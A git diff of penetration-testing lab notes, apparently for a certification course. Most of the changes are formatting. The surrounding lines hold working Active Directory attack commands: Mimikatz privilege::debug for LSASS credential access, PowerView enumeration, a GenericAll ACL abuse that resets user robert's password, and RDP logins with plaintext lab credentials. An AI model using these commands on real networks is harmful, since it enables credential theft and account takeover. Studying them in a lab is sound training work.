@@ -2422,8 +2422,9 @@ Reference
   - hashes are stored in the Local Security Authority Subsystem Service (LSASS)
   - Connecting to CLIENT75 via RDP  
     `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75 /cert:ignore /drive:share,/home/kali/share`  
-  - Starting Mimikatz and enabling SeDebugPrivilege  
+  - Starting Mimikatz (admin) and enabling SeDebugPrivilege  
     ```
+    PS C:\Windows\system32> cd C:\Tools
     PS C:\Tools\> .\mimikatz.exe
     mimikatz # privilege::debug
     ```
@@ -4150,17 +4151,17 @@ Reference
     `Get-NetComputer -Name FILES04 | select operatingsystem, operatingsystemversion`  
     `Get-NetComputer | select name, operatingsystem, operatingsystemversion`   
 - Getting overview of permissions and logged on users
-  - Find out which new machine has administrative privileges
+  - Find out which new machine has administrative privileges  
     `Find-LocalAdminAccess`
     `xfreerdp3 /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.154.72 /cert:ignore /drive:share,/home/kali/share`  
 - capstones (Misconfigured GenericAll access)
-  - Find ACL misconfigurations (GenericAll-can reset password without knowing old one)/ Bloodhount > robert
+  - Find ACL misconfigurations (GenericAll-can reset password without knowing old one)/ Bloodhount > robert  
     `Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft`
-  - Reset Robert’s password
+  - Reset Robert’s password  
     `Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)`
-  - check robert's privilege (Use PowerView to see where Robert is local admin) > client74
+  - check robert's privilege (Use PowerView to see where Robert is local admin) > client74  
     `Find-LocalAdminAccess -Credential (New-Object System.Management.Automation.PSCredential("CORP\robert",(ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)))`  
-  - RDP to client74
+  - RDP to client74  
     `xfreerdp3 /u:robert /p:'NewP@ssw0rd!' /d:corp.com /v:192.168.154.74 /cert:ignore /drive:share,/home/kali/share`
 
 ## Penetration testing report 
